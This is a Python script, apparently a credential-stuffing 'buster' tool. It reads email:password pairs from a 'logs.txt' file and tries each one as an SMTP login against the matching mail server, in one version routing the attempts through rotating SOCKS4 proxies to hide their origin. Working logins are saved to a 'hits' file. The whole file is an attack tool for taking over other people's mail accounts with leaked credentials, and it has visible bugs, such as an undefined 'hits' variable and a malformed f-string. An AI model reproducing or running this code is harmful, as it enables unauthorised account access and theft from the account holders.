import smtplib
import socks
import socket
import time
import os
import datetime
def buster():
    os.system("cls")

    def get_smtp_server(domain):
        try:
            with open('smtpservers.conf', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        conf_domain, smtp_server = line.split(':')
                        if domain == conf_domain:
                            return smtp_server
        except Exception as e:
            print(f"Error reading smtpservers.conf: {str(e)}")
        return None

    proxies = []
    try:
        with open('proxies.txt', 'r') as proxies_file:
            for line in proxies_file:
                line = line.strip()
                if line:
                    proxies.append(line)
    except Exception as e:
        print(f"Error reading proxies.txt: {str(e)}")

    if not proxies:
        print("No proxies found in proxies.txt. Script will not run.")
        return

    any_proxy_successful = False

    try:
        with open('logs.txt', 'r') as log_file:
            for line in log_file:
                line = line.strip()
                if line and ':' in line:
                    email, password = line.split(':')

                    if "@" in email:
                        domain = email.split("@")[1]

                    if domain.lower() in ('yahoo.com', 'gmail.com'):
                        print(f"Skipping {email} (Yahoo/Gmail domain)")
                        continue

                    smtp_server = get_smtp_server(domain)

                    if smtp_server:
                        authentication_successful = False

                        for proxy in proxies:
                            proxy_ip, proxy_port = proxy.split(':')
                            with socks.socksocket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                s.settimeout(10)
                                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))

                                try:
                                    start_time = time.time()
                                    s.connect((smtp_server, 587))
                                    s.sendall(b'Hello, server!\n')
                                    response = s.recv(1024)
                                    elapsed_time = time.time() - start_time
                                    print(f"Response from {proxy}: {response.decode('utf-8')}")

                                    if elapsed_time > 0.5:
                                        print(
                                            f"Connection to {proxy} took longer than 2 seconds. Skipping to the next proxy.")
                                        continue

                                    server = smtplib.SMTP(smtp_server, 587)
                                    server.starttls()
                                    server.login(email, password)
                                    print(f"Authentication successful for: {email} via proxy {proxy}")
                                    hits.write(f"{email:{password}}")
                                    server.quit()

                                    authentication_successful = True
                                    any_proxy_successful = True
                                    break
                                except Exception as e:
                                    print(f"Proxy {proxy} failed for {email}: {str(e)}")

                        if not authentication_successful:
                            print(f"Authentication failed for {email}")
                    else:
                        print(f"SMTP server not found for domain: {domain}")
    except Exception as e:
        print(f"Error reading logs.txt: {str(e)}")

    if not any_proxy_successful:
        print("No proxy connection was successful. Script will not run.")

def proxylessbuster():
    current_datetime = datetime.now().strftime("%Y%m%d_%H%M%S")

    hits_filename = f"hits_{current_datetime}.txt"

    if not os.path.exists(hits_filename):
        hits = open(hits_filename, "w")
    else:
        hits = open(hits_filename, "a")

    os.system("cls")

    def get_smtp_server(domain):
        try:
            with open('smtpservers.conf', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        conf_domain, smtp_server = line.split(':')
                        if domain == conf_domain:
                            return smtp_server
        except Exception as e:
            print(f"Error reading smtpservers.conf: {str(e)}")
        return None

    try:
        with open('logs.txt', 'r') as log_file:
            for line in log_file:
                line = line.strip()
                if line and ':' in line:
                    email, password = line.split(':')

                    if "@" in email:
                        domain = email.split("@")[1]

                    # Skip lines containing Yahoo and Gmail domains
                    if domain.lower() in ('yahoo.com', 'gmail.com'):
                        print(f"Skipping {email} (Yahoo/Gmail domain)")
                        continue

                    smtp_server = get_smtp_server(domain)

                    if smtp_server:
                        try:
                            server = smtplib.SMTP(smtp_server, 587)
                            server.starttls()
                            server.login(email, password)
                            hits.write(f"{email}:{password}\n")
                            print(f"Authentication successful for: {email}")
                            server.quit()
                        except Exception as e:
                            print(f"Authentication failed for {email}: {str(e)}")
                    else:
                        print(f"SMTP server not found for domain: {domain}")
    except Exception as e:
        print(f"Error reading logs.txt: {str(e)}")

    hits.close()